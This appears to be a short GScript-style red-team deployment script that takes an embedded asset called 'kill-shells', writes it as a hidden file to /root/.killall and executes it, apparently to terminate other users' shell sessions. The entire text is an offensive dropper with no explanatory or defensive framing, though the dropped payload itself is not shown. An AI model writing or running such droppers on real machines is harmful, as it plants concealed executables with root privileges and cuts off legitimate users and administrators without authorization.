//priority:210
//timeout:90

//import:kill-shells

function Deploy() {
	 var killall = GetAssetAsBytes("kill-shells");
	 var path = "/root/.killall";

	 G.file.WriteFileFromBytes(path, killall[0]);
	 G.exec.ExecuteCommandAsync(path, [""]);
}
